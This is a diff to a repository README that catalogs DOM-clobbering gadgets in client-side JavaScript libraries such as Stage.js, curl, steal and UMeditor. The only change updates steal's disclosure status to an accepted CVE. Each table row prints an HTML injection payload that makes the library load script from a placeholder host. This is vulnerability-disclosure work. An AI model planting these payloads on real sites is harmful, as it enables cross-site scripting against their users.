@@ -26,7 +26,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 | [Stage.js](./domc-gadgets/stage.js.md) | 2.4K | v1-alpha | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
 | [curl](./domc-gadgets/curl.md) | 1.8K | v0.8.13 | ```<img name="scripts" data-curl-run="http://xxx.xxx.xxx/"><img name="scripts" data-curl-run="http://xxx.xxx.xxx"> ``` | XSS | TheHulk | Reported | N/A |
 | [inspire.js](./domc-gadgets/inspire.js.md) | 1.7K | v1.10 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Reported | N/A |
-| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Mitre | N/A |
+| [steal](./domc-gadgets/steal.md) | 1.4K | v2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
 | [UMeditor](./domc-gadgets/umeditor.md) | 1.4K | v1.2.2 | ```<a id="UMEDITOR_HOME_URL" href="https://xxx.xxx.xxx/"></a>``` | XSS | TheHulk | Reported | N/A |
 | [squirt](./domc-gadgets/squirt.md) | 1.2K | v0.0.1 | ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">``` | XSS | TheHulk | Reported | N/A |
 | [ckplayer](./domc-gadgets/ckplayer.md) | 1.1K | latest | ```<img name="scripts" src="https://xxx.xxx.xxx/js/"><img name="scripts" src="https://xxx.xxx.xxx/js/">``` | XSS | TheHulk | N/A | N/A |
